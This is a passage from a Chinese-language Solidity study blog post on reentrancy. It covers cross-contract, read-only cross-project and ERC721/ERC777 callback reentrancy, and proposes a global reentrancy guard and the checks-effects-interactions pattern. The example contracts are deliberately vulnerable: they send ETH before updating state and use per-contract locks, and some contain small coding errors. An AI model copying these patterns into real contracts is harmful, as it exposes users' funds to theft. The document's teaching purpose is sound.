<h2 id="2-跨合约重入攻击"><a href="#2-跨合约重入攻击" class="headerlink" title="2. 跨合约重入攻击"></a>2. 跨合约重入攻击</h2><p>我们的第二位受害者是一个多合约组合系统，它是一个去中心化合约交易平台，我们只看问题发生的关键处，是跟两个合约有关。第一个合约是<code>TwoStepSwapManager</code>, 它是面向用户的合约，里面包含有允许用户直接发起的提交一个swap交易的函数，还有同样是可由用户发起的，用来取消正在等待执行但尚未执行的swap交易的函数；第二个合约是<code>TwoStepSwapExecutor</code>, 它是只能由管理的角色来发起的交易，用于执行某个处于等待中的swap交易。这两个合约的 <em>部分</em> 示例代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Contracts to create and manage swap &quot;requests&quot;<br><br>contract TwoStepSwapManager &#123;<br>    struct Swap &#123;<br>        address user;<br>        uint256 amount;<br>        address[] swapPath;<br>        bool unwrapnativeToken;<br>    &#125;<br><br>    uint256 swapNonce;<br>    mapping(uint256 =&gt; Swap) pendingSwaps;<br><br>    uint256 private _status; // 重入锁<br><br>    // 重入锁<br>    modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>        require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>        _status = 1;<br>        _;<br>      // 调用结束，将 _status 恢复为0<br>        _status = 0;<br>     &#125;<br><br>    function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant &#123;<br>        IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);<br>        pendingSwaps[++swapNounce] = Swap(&#123;<br>            user: msg.sender,<br>            amount: _amount,<br>            swapPath: _swapPath,<br>            unwrapNativeToken: _unwrapNativeToken<br>        &#125;);<br>    &#125;<br><br>    function cancelSwap(uint256 _id) external nonReentrant &#123;<br>        Swap memory swap = pendingSwaps[_id];<br>        require(swap.user == msg.sender);<br>        delete pendingSwaps[_id];<br><br>        IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>// Contract to exeute swaps<br><br>contract TwoStepSwapExecutor &#123;<br><br><br>    /* <br>        Logic to set prices etc... <br>    */<br><br><br>    uint256 private _status; // 重入锁<br><br>    // 重入锁<br>    modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>        require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>        _status = 1;<br>        _;<br>      // 调用结束，将 _status 恢复为0<br>        _status = 0;<br>    &#125;<br><br>    function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant &#123;<br>        Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);<br>				//走到这里的时候，已经调用了重入锁，标记为1，但是进到ISwapManager的swap的时候，使用的又是ISwapManager的重入锁 ISwapManager是0呀<br>        // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user<br>        ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);<br><br>        ISwapManager(swapManager).delete(pendingSwaps[_id]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>从上面两个合约的示例代码可以看出，所有相关的函数均使用了重入锁。然而，那个男人还是成功地对戴锁婆婆施展了重入魔法，再再再一次卷走了原本不属于他的钱财。这一次，他又是如何做到的呢？</p>
<p>俗话说得好， <em>“灯下黑“</em> ，答案就在最表面上反而容易被忽视 — 因为这是 两 个 合 约…锁的状态是不互通的！ 管理员调用了<code>executeSwap</code>来执行了那个攻击者提交的swap，此合约的重入锁开始生效变成<code>1</code>。当运行到中间那步<code>swap（）</code>的时候，发起了<code>ETH</code>转账，将执行权交给了攻击者的恶意合约的<code>fallback</code>函数，在那里被设置了对<code>TwoStepSwapManager</code>合约的<code>cancelSwap</code>函数的调用，而此时这个合约的重入锁还是<code>0</code>，所以<code>cancelSwap</code>开始执行，此合约的重入锁开始生效变成<code>1</code>，然而为时已晚。。。 攻击者收到了<code>executeSwap</code>发送给他的swap过来的<code>ETH</code>，同时还收到了<code>cancelSwap</code>退给他的当初送出去用来swap的本金代币。他他他又一次“无中生有”了！</p>
<blockquote>
<p> 这里就很复杂，看起来是两个合约的所有的方法都加了重入锁，但其实这是两个合约，他们之间的重入锁是不互通的，但管理员调用executeSwap方法的时候，TwoStepSwapExecutor合约的重入锁被标记为1，锁住，然后进入到ISwapManager的swap方法的时候，又是ISwapManager合约的重入锁，ISwapManager还是新的呀，没有锁住，嘎嘎又被双花了</p>
</blockquote>
<h3 id="全局重入锁"><a href="#全局重入锁" class="headerlink" title="全局重入锁"></a>全局重入锁</h3><p>若想要防范这种跨合约重入攻击，我这里送同学们一个重入锁的升级版 – 全局重入锁。适合用于同学们以后架构多合约系统。请看以下简易代码思路：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abstract contract GlobalReentrancyGuard&#123;<br>    uint256 private constant NOT_ENTERED = 0;//未进入<br>    uint256 private constant ENTERED = 1;//进入<br><br>    DataStore public immutable dataStore;<br><br>    constructor(DataStore _datastore) &#123;<br>        dataStore = _dataStore;<br>    &#125;<br>	// 还是一个修饰符在修饰函数<br>    modifier globalNonReentrant() &#123;<br>        _nonReentrantBefore();<br>        _;<br>        _nonReentrantAfter();<br>    &#125;<br><br>    function _nonReentrantBefore() private &#123;<br>        uint256 status = dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS);<br><br>        require(status == NOT_ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);<br><br>        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, ENTERED);<br>    &#125;<br><br>    function _nonReentrantAfter() private &#123;<br>        dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, NOT_ENTERED);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>一句话概括这个全局重入锁的核心就是，建立一个单独的合约用来储存重入状态，然后，在你的系统里的任何合约里相关的函数在执行的时候，都要来这同一个地方来查看当前的重入状态，这样你的所有合约就都被重入保护起来了。</p>
<p>看似美妙，但还没完… 攻击者还有更新的花招即便是用全局重入锁也无法防范的。接着往下看: …</p>
<h2 id="3-跨项目重入攻击"><a href="#3-跨项目重入攻击" class="headerlink" title="3. 跨项目重入攻击"></a>3. 跨项目重入攻击</h2><p>越写越大了。。。所谓跨项目的重入攻击，其核心与上面两例其实也是比较类似。本质就是趁某项目合约的某个状态变量在还未来得及更新时，就利用接手的执行权来发起外部函数调用。如果有第三方合作项目的合约是依赖于前面提到的项目合约里这个状态变量的值来做某些决策的，那么攻击者就可以去攻击这个合作项目的合约，因为在此刻它读到的是一个过期的状态值，会导致它执行一些错误的行为令攻击者获利。 通常，合作项目的合约通过一些<code>getter</code>函数或其他公开的只读函数的调用来传递信息，所以这类攻击也通常体现为<code>只读重入攻击 Read-Only Reentrancy</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>contract VulnerableBank &#123;<br>  mapping(address =&gt; uint256) public balances;<br><br>  uint256 private _status; // 重入锁<br><br>  // 重入锁<br>  modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>       require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>      _status = 1;<br>      _;<br>      // 调用结束，将 _status 恢复为0<br>      _status = 0;<br>  &#125;<br><br>  function deposit() external payable &#123;<br>    require(msg.value &gt; 0, &quot;Deposit amount must ba greater than 0&quot;);<br>    balances[msg.sender] += msg.value;<br>  &#125;<br><br>  function withdraw(uint256 _amount) external nonReentrant &#123;<br>    require(_amount &gt; 0, &quot;Withdrawal amount must be greater than 0&quot;);<br>    require(isAllowedToWithdraw(msg.sender, _amount), &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>    require(success, &quot;Withdraw failed&quot;);<br><br>    balances[msg.sender] -= _amount;<br>  &#125;<br><br>  function isAllowedToWithdraw(address _user, uint256 _amount) public view returns(bool) &#123;<br>    return balances[_user] &gt;= _amount;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如代码所示，在这个合约中，已经没有攻击者发挥重入的空间了。然而，这里没有，不代表别处没有。。。 我们可以看到合约里有一个公开的只读函数<code>isAllowedToWithdraw</code>，这类函数就是用来以提供信息为目的的。很多项目的合约里都或多或少有一些这类函数，而这类函数又常被其他项目的合约来调用获取信息，最终完成Defi世界里的一个乐高积木。可以看到这个重要的<code>withdraw</code>函数已经被上了锁，不可以重入攻击，但是在他的执行过程中的<code>ETH</code>转账那一步，<code>ETH</code>刚刚转出，假设攻击者想要此刻调用<code>isAllowedToWithdraw</code>函数，可以预见即便是<code>_amount</code>数值很大，攻击者的存款实际已被掏空，但返回值仍然是<code>true</code>因为账本在此刻还没有更新。那么，攻击者就可以在他的恶意合约里的<code>fallback</code>函数中设置外部函数调用,去攻击他已知的其他项目的依据<code>isAllowedToWithdraw</code>函数返回结果来制定操作的那些合约。</p>
<p>上面这个合约本身不遭攻击，而合作伙伴的合约遭到攻击。。。典型的：</p>
<p><em>“我不杀伯仁，伯仁却因我而死…” – 戴锁婆婆</em></p>
<p>针对<code>Read-Only Reentrancy</code>, <a target="_blank" rel="noopener" href="https://github.com/euler-xyz/euler-contracts/commit/91adeee39daf8ece00584b6f7ec3e60a1d226bc9#diff-05f47d885ccf959493d5c53203672966544d73232f5410184d5484a7aedf0c5eR260">Euler Finance</a>采用<code>read-only reentrancy guard</code>，仅当未加锁时才能进行读取。同时，锁的可见性可以设置为<code>public</code>以供其他项目使用</p>
<blockquote>
<p>这就是典型的依赖缺陷，比如说有一个项目，它依赖的就是VulnerableBank的isAllowedToWithdraw函数攻击者可以对合约发起攻击，但被攻击合约还没有来得及调用依赖的isAllowedToWithdraw函数的返回内容时就被掏空了，这里很抽象很绕啊</p>
</blockquote>
<h2 id="4-ERC721-ERC777-Reentrancy"><a href="#4-ERC721-ERC777-Reentrancy" class="headerlink" title="4. ERC721 &amp; ERC777 Reentrancy"></a>4. ERC721 &amp; ERC777 Reentrancy</h2><p>这两种代币标准都各自规定了一个回调函数：</p>
<p>ERC721: <code>function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4);</code></p>
<p>ERC777: <code>function tokensReceived(address _operator, address _from, address _to, uint256 _amount, bytes calldata _userData, bytes calldata _operatorData) external;</code></p>
<p>有回调函数的存在就有接手代码执行权的机会，同时也会营造出重入攻击的可能性。对这一情况就不展示代码示例了，因为结合上述几个案例，这一条现在应该很容易理解了。并且，实在是能够玩出无穷花样。</p>
<blockquote>
<p>只要有回调函数，就有重入的可能性</p>
</blockquote>
<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>至此，我们审阅了几个实际发生的，各种花样的重入攻击的逻辑本体和它们的简易代码，相信各位同学应该不难看出，这些合约被攻击，是由于它们都共有一个缺陷。那就是这些合约的设计对于重入攻击的防范，都太过于依赖一个直截了当的工具（重入锁）的保护，而没有贯彻另一条良好的设计习惯 <em>检查-影响-交互模式</em> 。 简单的工具永远不会是完美防御，贯彻的方法论才是你永远的后盾 <em>（报告首长，本节代码课的思政任务已传达，请验收）</em></p>
<p>所以，对于使用小工具，还是使用方法论的取舍，我们作为solidity devs，答案我想应该是：既要…又要…！从跨函数的攻击，再到跨合约，跨项目的攻击，若是要求devs和auditors记住这越来越庞大的乐高之间的千丝万缕的联系，实在是有些强人所难。于是，在构造过程中的每一步，都标准地布置多道不同防御机制，便能省心地获得更好的结果。</p>
<h1 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h1>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>08-9Solidity笔记之十合约安全项</div>
      <div>http://example.com/2025/08/21/08-9Solidity笔记之十合约安全项/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Wangxiaowang</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年8月21日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2026/02/04/08-10Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8D%81%E4%B8%80%E9%A2%84%E8%A8%80%E6%9C%BA/" title="08-10Solidity笔记之十一预言机">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">08-10Solidity笔记之十一预言机</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/14/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B9%9D/" title="08-9Solidity笔记之九闪电贷套利">
                        <span class="hidden-mobile">08-9Solidity笔记之九闪电贷套利</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="waline"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#waline', function() {
      Fluid.utils.createCssLink('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.css')
      Fluid.utils.createScript('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.js', function() {
        var options = Object.assign(
          {"serverURL":"https://my-waline-rosy-one.vercel.app","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":[],"lang":"zh-cn","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"auto","wordLimit":0,"pageSize":10,"enable":true,"placeholder":"欢迎留下评论，嘿嘿！","avatar":"mm","visitor":true,"comment_count":true,"libUrl":null},
          {
            el: '#waline',
            path: window.location.pathname
          }
        )
        Waline.init(options);
        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
          var imgSelector = '#waline .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
